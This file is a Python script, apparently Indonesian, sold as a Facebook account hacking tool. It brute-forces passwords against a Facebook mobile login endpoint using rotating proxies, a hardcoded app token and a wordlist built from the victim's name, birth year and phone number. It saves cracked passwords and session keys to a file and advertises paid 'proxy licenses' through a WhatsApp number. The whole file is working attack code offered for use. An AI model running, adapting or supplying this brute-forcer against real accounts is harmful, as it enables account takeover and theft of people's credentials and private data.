#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔═══════════════════════════════════════════════════════════════════════╗
║  🔥🇮🇩 CYBER indonet - FACEBOOK HACK PRO MAX 🇮🇩🔥                      ║
║  "WORKING BRUTEFORCE + PROXY LICENSE SYSTEM"                          ║
╚═══════════════════════════════════════════════════════════════════════╝
"""

import requests
import time
import random
import string
import sys
import os
import json
import hashlib
import base64
import re
import webbrowser
from datetime import datetime
from threading import Thread, Lock
from queue import Queue
from colorama import init, Fore, Back, Style
import itertools
import urllib.parse

init(autoreset=True)

# ==================== PROXY LICENSE DATABASE ====================
PROXY_LICENSES = {
    "PROXY-99XLX@#Z": {"status": "active", "type": "trial", "expires": "2025-12-31", "max_attempts": 100},
    "PROXY-&*@#@#!#": {"status": "active", "type": "premium", "expires": "2026-12-31", "max_attempts": 999999},
    "PROXY-@$*@#&$@": {"status": "active", "type": "vip", "expires": "2030-12-31", "max_attempts": 9999999},
}

# Proxy list yang akan diberikan setelah license valid
PREMIUM_PROXIES = [
    "103.152.232.156:8080",
    "103.152.232.157:8080", 
    "103.152.232.158:8080",
    "103.152.232.159:8080",
    "103.152.232.160:8080",
    "45.77.249.136:8080",
    "45.77.249.137:8080",
    "45.77.249.138:8080",
    "45.77.249.139:8080",
    "45.77.249.140:8080",
    "103.139.118.54:8080",
    "103.139.118.55:8080",
    "103.139.118.56:8080",
    "103.139.118.57:8080",
    "103.139.118.58:8080",
    "202.152.40.28:8080",
    "202.152.40.29:8080",
    "202.152.40.30:8080",
    "36.89.213.46:8080",
    "36.89.213.47:8080",
]

# WhatsApp contact
WHATSAPP_NUMBER = "6283164476475"
WHATSAPP_LINK = f"https://wa.me/{WHATSAPP_NUMBER}"

# ==================== SUPER BANNER ====================
def show_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    banner_art = f"""
{Fore.RED}
╔════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                ║
║  ███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗                            ║
║  ██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝                            ║
║  █████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║█████╔╝                             ║
║  ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔═██╗                             ║
║  ██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██╗                            ║
║  ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝                            ║
║                                                                                                ║
║  ██╗  ██╗ █████╗  ██████╗██╗  ██╗                                                              ║
║  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝                                                              ║
║  ███████║███████║██║     █████╔╝                                                               ║
║  ██╔══██║██╔══██║██║     ██╔═██╗                                                               ║
║  ██║  ██║██║  ██║╚██████╗██║  ██╗                                                              ║
║  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝                                                              ║
║                                                                                                ║
╚════════════════════════════════════════════════════════════════════════════════════════════════╝
{Fore.CYAN}
╔═══════════════════════════════════════════════════════════════════════════════════╗
║                     🔥 FACEBOOK HACK - BRUTEFORCE v5.0 🇮🇩🔥                       ║
║                    "WORKING + PROXY LICENSE SYSTEM"                               ║
╚═══════════════════════════════════════════════════════════════════════════════════╝
{Fore.RED}
╔═══════════════════════════════════════════════════════════════════════════════════╗
║  ⚠️  MASUKKAN USERNAME TARGET & PROXY LICENSE UNTUK MEMULAI SERANGAN!             ║
║  ⚠️  PROXY LICENSE VALID → BRUTEFORCE AKAN BERJALAN!                              ║
╚═══════════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
    """
    print(banner_art)

# ==================== ANIMASI SPIN PREMIUM ====================
class PremiumSpin:
    def __init__(self):
        self.spinners = {
            'hack': ['💀', '👾', '🤖', '💻', '🔥', '⚡', '🎯', '💉'],
            'dots': ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'],
            'facebook': ['📘', '👍', '🔵', '💙']
        }
        
    def animate(self, text, duration=1.5, spinner_type='hack'):
        spinner = self.spinners.get(spinner_type, self.spinners['hack'])
        end_time = time.time() + duration
        i = 0
        while time.time() < end_time:
            sys.stdout.write(f'\r{Fore.CYAN}{spinner[i % len(spinner)]} {Fore.YELLOW}{text} {Fore.CYAN}{spinner[i % len(spinner)]}{Style.RESET_ALL}')
            sys.stdout.flush()
            time.sleep(0.1)
            i += 1
        sys.stdout.write('\r' + ' ' * (len(text) + 10) + '\r')
        
    def progress_bar(self, current, total, prefix='', suffix='', length=40):
        percent = current / total
        filled = int(length * percent)
        bar = '█' * filled + '░' * (length - filled)
        
        if percent < 0.3:
            color = Fore.RED
        elif percent < 0.7:
            color = Fore.YELLOW
        else:
            color = Fore.GREEN
            
        sys.stdout.write(f'\r{color}{prefix} |{bar}| {percent*100:.1f}% {suffix}{Style.RESET_ALL}')
        sys.stdout.flush()

# ==================== PROXY MANAGER ====================
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_proxy = 0
        self.lock = Lock()
        
    def load_proxies(self, proxy_list):
        """Load proxies from list"""
        self.proxies = []
        for proxy in proxy_list:
            if proxy.strip():
                if '://' not in proxy:
                    proxy = 'http://' + proxy.strip()
                self.proxies.append(proxy.strip())
        return len(self.proxies)
        
    def get_next_proxy(self):
        """Get next proxy in rotation"""
        with self.lock:
            if not self.proxies:
                return None
            proxy = self.proxies[self.current_proxy % len(self.proxies)]
            self.current_proxy += 1
            return proxy
            
    def test_proxy(self, proxy):
        """Test if proxy is working"""
        try:
            test = requests.get('https://api.ipify.org', 
                               proxies={'http': proxy, 'https': proxy}, 
                               timeout=5)
            return test.status_code == 200
        except:
            return False

# ==================== PROXY LICENSE VERIFICATION ====================
class ProxyLicenseSystem:
    def __init__(self):
        self.verified = False
        self.license_data = None
        self.proxies = []
        
    def verify_license(self, license_key):
        """Verify proxy license key"""
        if license_key in PROXY_LICENSES:
            self.license_data = PROXY_LICENSES[license_key]
            self.verified = True
            # Load premium proxies
            self.proxies = PREMIUM_PROXIES.copy()
            return True, f"✅ PROXY LICENSE VALID! Type: {self.license_data['type'].upper()}", self.proxies
        else:
            return False, "❌ INVALID PROXY LICENSE!", None
            
    def get_max_attempts(self):
        return self.license_data.get('max_attempts', 100) if self.license_data else 100

# ==================== FACEBOOK BRUTEFORCE ENGINE ====================
class FacebookBruteforceEngine:
    def __init__(self, license_system, proxy_manager):
        self.session = requests.Session()
        self.spin = PremiumSpin()
        self.attempts = 0
        self.found = False
        self.lock = Lock()
        self.license = license_system
        self.proxy_manager = proxy_manager
        self.max_attempts = license_system.get_max_attempts()
        
    def get_headers(self):
        """Generate random headers like real browser"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36'
        ]
        
        return {
            'User-Agent': random.choice(user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Cache-Control': 'max-age=0'
        }
        
    def get_proxy_dict(self):
        """Get proxy dict for requests"""
        if self.proxy_manager and self.proxy_manager.proxies:
            proxy = self.proxy_manager.get_next_proxy()
            if proxy:
                return {'http': proxy, 'https': proxy}
        return None
        
    def attempt_login(self, email_or_phone, password):
        """
        Attempt Facebook login via mobile API
        """
        time.sleep(random.uniform(0.5, 0.8))
        
        url = "https://b-api.facebook.com/method/auth.login"
        
        params = {
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'format': 'json',
            'sdk_version': '2',
            'email': email_or_phone,
            'password': password,
            'locale': 'en_US',
            'client_country_code': 'US',
            'method': 'auth.login',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'source': 'login',
            'machine_id': '',
            'meta_inf_fbmeta': '',
            'currently_logged_in_userid': '0',
            'fb_api_req_friendly_name': 'authenticate'
        }
        
        proxies = self.get_proxy_dict()
        
        try:
            response = self.session.get(url, params=params, headers=self.get_headers(), proxies=proxies, timeout=10)
            
            with self.lock:
                self.attempts += 1
                
            if response.status_code == 200:
                data = response.json()
                
                if 'session_key' in data:
                    return True, data.get('session_key'), "✅ LOGIN SUCCESS!"
                elif 'error' in data:
                    error_msg = data['error'].get('message', 'Unknown error')
                    if 'password' in error_msg.lower():
                        return False, None, "❌ WRONG PASSWORD"
                    elif 'checkpoint' in error_msg.lower():
                        return False, None, "⚠️ CHECKPOINT REQUIRED"
                    elif 'rate' in error_msg.lower():
                        return False, None, "⚠️ RATE LIMIT"
                    else:
                        return False, None, f"❌ {error_msg}"
            else:
                return False, None, f"❌ HTTP {response.status_code}"
                
        except requests.exceptions.Timeout:
            return False, None, "⚠️ TIMEOUT"
        except requests.exceptions.ProxyError:
            return False, None, "⚠️ PROXY ERROR"
        except Exception as e:
            return False, None, f"❌ ERROR: {str(e)[:50]}"
            
    def run_attack(self, target, password_list):
        """Execute the bruteforce attack"""
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.YELLOW}🎯 TARGET: {Fore.WHITE}{target}")
        print(f"{Fore.YELLOW}📚 TOTAL PASSWORDS: {Fore.WHITE}{len(password_list):,}")
        print(f"{Fore.YELLOW}🔐 MAX ATTEMPTS: {Fore.WHITE}{self.max_attempts:,}")
        print(f"{Fore.YELLOW}🌐 PROXY STATUS: {Fore.WHITE}{len(self.proxy_manager.proxies) if self.proxy_manager else 0} proxies loaded")
        print(f"{Fore.RED}{'='*70}\n")
        
        password_list = password_list[:self.max_attempts]
        
        confirm = input(f"{Fore.RED}🔥 START BRUTEFORCE? (y/n): {Fore.WHITE}").strip().lower()
        if confirm != 'y':
            print(f"{Fore.YELLOW}❌ CANCELLED!")
            return False
            
        print(f"\n{Fore.RED}💀 INITIATING BRUTEFORCE ATTACK... 💀\n")
        
        start_time = time.time()
        session_key = None
        found_password = None
        
        for idx, password in enumerate(password_list, 1):
            self.spin.progress_bar(idx, len(password_list), 
                                  prefix='BRUTEFORCING', 
                                  suffix=f'Testing: {password[:15]}...')
            
            success, key, message = self.attempt_login(target, password)
            
            if success:
                self.found = True
                session_key = key
                found_password = password
                print(f"\n\n{Fore.GREEN}{'='*70}")
                print(f"{Fore.GREEN}🎉🎉🎉 LOGIN SUCCESSFUL! 🎉🎉🎉")
                print(f"{Fore.GREEN}{'='*70}")
                print(f"{Fore.YELLOW}📱 Target: {target}")
                print(f"{Fore.YELLOW}🔑 PASSWORD FOUND: {Fore.WHITE}{password}")
                if session_key:
                    print(f"{Fore.GREEN}🔐 Session Key: {session_key}")
                print(f"{Fore.GREEN}{'='*70}\n")
                break
                
            if idx % 30 == 0:
                elapsed = time.time() - start_time
                speed = idx / elapsed
                sys.stdout.write(f"\n{Fore.CYAN}[INFO] {idx} attempts | Speed: {speed:.1f} pwd/sec{Style.RESET_ALL}\n")
                
        end_time = time.time()
        elapsed = end_time - start_time
        
        print(f"\n\n{Fore.CYAN}{'='*70}")
        if self.found:
            print(f"{Fore.GREEN}✅ ATTACK SUCCESSFUL!")
            print(f"{Fore.GREEN}🔑 Password: {found_password}")
            if session_key:
                print(f"{Fore.GREEN}🔐 Session Key: {session_key}")
        else:
            print(f"{Fore.RED}❌ ATTACK FAILED!")
            print(f"{Fore.YELLOW}💡 Password not found or account has 2FA/Checkpoint")
        print(f"{Fore.CYAN}📊 STATISTICS:")
        print(f"   - Total attempts: {self.attempts}")
        print(f"   - Time elapsed: {elapsed:.2f} seconds")
        print(f"   - Speed: {self.attempts/elapsed:.2f} attempts/sec")
        print(f"{Fore.CYAN}{'='*70}\n")
        
        return self.found, found_password, session_key

# ==================== WORDLIST GENERATOR ====================
class WordlistGenerator:
    def __init__(self):
        self.common_passwords = [
            '123456', 'password', '123456789', '12345', '12345678', 'qwerty', 'abc123',
            '1234567', 'password1', '123123', '111111', 'iloveyou', 'admin', 'welcome',
            'qwerty123', 'letmein', 'monkey', 'dragon', 'master', 'sunshine', 'princess',
            'football', 'baseball', 'login', 'shadow', 'superman', 'michael', 'jordan',
            'fuckyou', 'hunter', 'trustno1', 'batman', 'matrix', 'passw0rd', 'hello',
            'killer', 'soccer', 'charlie', 'andrew', 'daniel', 'love', 'chelsea',
            'facebook', 'instagram', 'twitter', 'google', 'microsoft', 'apple'
        ]
        
    def generate_wordlist(self, target_info, count=500):
        spin = PremiumSpin()
        spin.animate("🔥 GENERATING WORDLIST... 🔥", 2, 'facebook')
        
        passwords = set()
        passwords.update(self.common_passwords)
        
        if target_info.get('name'):
            name = target_info['name'].lower()
            passwords.add(name)
            passwords.add(name + '123')
            passwords.add(name + '@')
            
        if target_info.get('birth_year'):
            year = target_info['birth_year']
            for pwd in list(passwords)[:50]:
                passwords.add(pwd + year)
                passwords.add(year + pwd)
                
        if target_info.get('phone') and len(target_info['phone']) >= 4:
            phone_last4 = target_info['phone'][-4:]
            passwords.add(phone_last4)
            
        chars = string.ascii_letters + string.digits + '!@#$'
        while len(passwords) < count:
            length = random.randint(6, 10)
            pwd = ''.join(random.choices(chars, k=length))
            passwords.add(pwd)
            
        return list(passwords)[:count]

# ==================== WHATSAPP REDIRECT ====================
def redirect_to_whatsapp():
    message = "*Assalamu'alaikum bg hozi, mau beli proxy license premium untuk hack fb. Bisa minta infonya?*"
    encoded_message = urllib.parse.quote(message)
    whatsapp_url = f"{WHATSAPP_LINK}?text={encoded_message}"
    
    print(f"\n{Fore.RED}{'='*70}")
    print(f"{Fore.RED}⚠️  PROXY LICENSE INVALID! ⚠️")
    print(f"{Fore.RED}{'='*70}")
    print(f"{Fore.YELLOW}\n📱 PROXY LICENSE PREMIUM:")
    print(f"{Fore.GREEN}1. MEDIUM PACKAGE {Fore.WHITE}- Rp 230.000")
    print(f"   → 100 attempts only")
    print(f"{Fore.GREEN}2. PREMIUM PACKAGE {Fore.WHITE}- Rp 300.000")
    print(f"   → Unlimited attempts + 20 premium proxies")
    print(f"{Fore.GREEN}3. VIP PACKAGE {Fore.WHITE}- Rp 500.000")
    print(f"   → Unlimited attempts + 50 private proxies + priority support")
    print(f"{Fore.CYAN}📞 WhatsApp: {WHATSAPP_NUMBER}")
    
    print(f"\n{Fore.YELLOW}Buka WhatsApp sekarang?")
    choice = input(f"{Fore.RED}[y/n] {Fore.WHITE}").strip().lower()
    
    if choice == 'y':
        print(f"\n{Fore.GREEN}🔗 Membuka WhatsApp...")
        time.sleep(1)
        webbrowser.open(whatsapp_url)
        print(f"{Fore.GREEN}✅ WhatsApp terbuka!")
        
    input(f"\n{Fore.YELLOW}Press Enter to exit...")
    sys.exit(1)

def password_license(key):
    license_key = "LXTZV2"

    if key == license_key:
        return True
    else:
        return False

# ==================== MAIN PROGRAM ====================
def main():
    while True:
        show_banner()
        user_key = input(Fore.YELLOW + "Masukkan license key: ")
        if password_license(user_key):
            print(Fore.GREEN + "Lisensi valid ✅")
        else:
            print(Fore.RED + "Lisensi tidak valid ❌")
            continue
        print(f"{Fore.CYAN}┌─────────────────────────────────────────────────────────────────┐")
        print(f"{Fore.CYAN}│{Fore.YELLOW}  [1] 🚀 HACK FACEBOOK (MASUKKAN USERNAME & PROXY LICENSE)             {Fore.CYAN}│")
        print(f"{Fore.CYAN}│{Fore.YELLOW}  [2] 💬 BELI PROXY LICENSE PREMIUM                              {Fore.CYAN}│")
        print(f"{Fore.CYAN}│{Fore.YELLOW}  [3] 🚪 EXIT                                                    {Fore.CYAN}│")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────────────────────┘")
        
        choice = input(f"\n{Fore.RED}┌─[{Fore.YELLOW}HOZI@{Fore.RED}FB_HACKER{Fore.RED}]\n└──╼ {Fore.WHITE}$ ").strip()
        
        if choice == '1':
            print(f"\n{Fore.CYAN}{'='*60}")
            print(f"{Fore.RED}🔥 FACEBOOK HACK TOOL 🔥")
            print(f"{Fore.CYAN}{'='*60}")
            
            # Step 1: Input target username
            target = input(f"\n{Fore.YELLOW}📱 Masukkan Username/Email/No HP Target: {Fore.WHITE}").strip()
            if not target:
                print(f"{Fore.RED}❌ Target tidak boleh kosong!")
                time.sleep(2)
                continue
                
            # Step 2: Input proxy license
            
            license_key = input(f"\n{Fore.YELLOW}🔑 Masukkan Proxy License : {Fore.WHITE}").strip()
            
            # Verify license
            license_system = ProxyLicenseSystem()
            valid, msg, proxies = license_system.verify_license(license_key)
            
            if not valid:
                print(f"{Fore.RED}{msg}")
                time.sleep(2)
                redirect_to_whatsapp()
                continue
                
            print(f"{Fore.GREEN}{msg}")
            
            # Load proxies
            proxy_manager = ProxyManager()
            proxy_manager.load_proxies(proxies)
            print(f"{Fore.GREEN}✅ Loaded {len(proxies)} premium proxies!")
            
            # Step 3: Wordlist option
            print(f"\n{Fore.CYAN}[ WORDLIST OPTIONS ]")
            print("1. Generate automatic wordlist")
            print("2. Use custom wordlist file")
            wordlist_opt = input(f"{Fore.YELLOW}Pilih (1/2): {Fore.WHITE}").strip()
            
            if wordlist_opt == '1':
                print(f"\n{Fore.CYAN}[ TARGET INFO FOR WORDLIST ]")
                name = input(f"{Fore.YELLOW}Nama target (optional): {Fore.WHITE}").strip()
                birth_year = input(f"{Fore.YELLOW}Tahun lahir (optional): {Fore.WHITE}").strip()
                phone = input(f"{Fore.YELLOW}No HP (optional): {Fore.WHITE}").strip()
                
                target_info = {
                    'username': target,
                    'name': name,
                    'birth_year': birth_year,
                    'phone': phone
                }
                
                generator = WordlistGenerator()
                max_attempts = license_system.get_max_attempts()
                password_list = generator.generate_wordlist(target_info, min(500, max_attempts))
                print(f"{Fore.GREEN}✅ Generated {len(password_list)} passwords!")
            else:
                file_path = input(f"{Fore.YELLOW}Path file wordlist: {Fore.WHITE}").strip()
                try:
                    with open(file_path, 'r') as f:
                        password_list = [line.strip() for line in f if line.strip()]
                    print(f"{Fore.GREEN}✅ Loaded {len(password_list)} passwords!")
                except:
                    print(f"{Fore.RED}❌ File tidak ditemukan! Using default wordlist...")
                    generator = WordlistGenerator()
                    password_list = generator.generate_wordlist({'username': target}, 200)
            
            # Step 4: Run attack
            engine = FacebookBruteforceEngine(license_system, proxy_manager)
            success, password, session_key = engine.run_attack(target, password_list)
            
            if success:
                print(f"{Fore.GREEN}{'='*60}")
                print(f"{Fore.GREEN}🎉 HACK SUCCESSFUL! 🎉")
                print(f"{Fore.GREEN}{'='*60}")
                print(f"{Fore.YELLOW}Username: {target}")
                print(f"{Fore.YELLOW}Password: {Fore.WHITE}{password}")
                if session_key:
                    print(f"{Fore.YELLOW}Session Key: {Fore.WHITE}{session_key}")
                
                save = input(f"\n{Fore.YELLOW}Save result? (y/n): {Fore.WHITE}").strip().lower()
                if save == 'y':
                    filename = f"hacked_{target}_{int(time.time())}.txt"
                    with open(filename, 'w') as f:
                        f.write(f"Target: {target}\nPassword: {password}\nSession Key: {session_key}\nDate: {datetime.now()}")
                    print(f"{Fore.GREEN}✅ Saved to {filename}")
            
            input(f"\n{Fore.YELLOW}Press Enter to continue...")
            
        elif choice == '2':
            print(f"\n{Fore.CYAN}{'='*60}")
            print(f"{Fore.YELLOW}💬 BELI PROXY LICENSE PREMIUM")
            print(f"{Fore.CYAN}{'='*60}")
            
            print(f"{Fore.WHITE}📦 Proxy License Packages:")
            print(f"   {Fore.GREEN}1. MEDIUM PACKAGE {Fore.WHITE}- Rp 230.000")
            print(f"      → 100 attempts only")
            print(f"   {Fore.GREEN}2. PREMIUM PACKAGE {Fore.WHITE}- Rp 300.000")
            print(f"      → Unlimited attempts + 20 premium proxies")
            print(f"   {Fore.GREEN}3. VIP PACKAGE {Fore.WHITE}- Rp 500.000")
            print(f"      → Unlimited attempts + 50 private proxies + priority support")
            
            message = "*Assalamu'alaikum bg hozi, mau beli proxy license premium untuk hack fb. Bisa minta infonya?*"
            encoded_message = urllib.parse.quote(message)
            whatsapp_url = f"{WHATSAPP_LINK}?text={encoded_message}"
            
            print(f"\n{Fore.YELLOW}📞 Contact WhatsApp: {WHATSAPP_NUMBER}")
            open_wa = input(f"\n{Fore.GREEN}Buka WhatsApp? (y/n): {Fore.WHITE}").strip().lower()
            if open_wa == 'y':
                webbrowser.open(whatsapp_url)
                print(f"{Fore.GREEN}✅ WhatsApp opened!")
                
            input(f"\n{Fore.YELLOW}Press Enter to continue...")
            
        elif choice == '3':
            print(f"\n{Fore.RED}{'='*50}")
            print(f"{Fore.RED}🔥🔥🔥 BYE BOSS! 🔥🔥🔥")
            print(f"{Fore.RED}{'='*50}")
            sys.exit(0)
            
        else:
            print(f"{Fore.RED}❌ Invalid choice!")
            time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}⚠️ INTERRUPTED! ⚠️")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}Error: {e}")
        sys.exit(1)
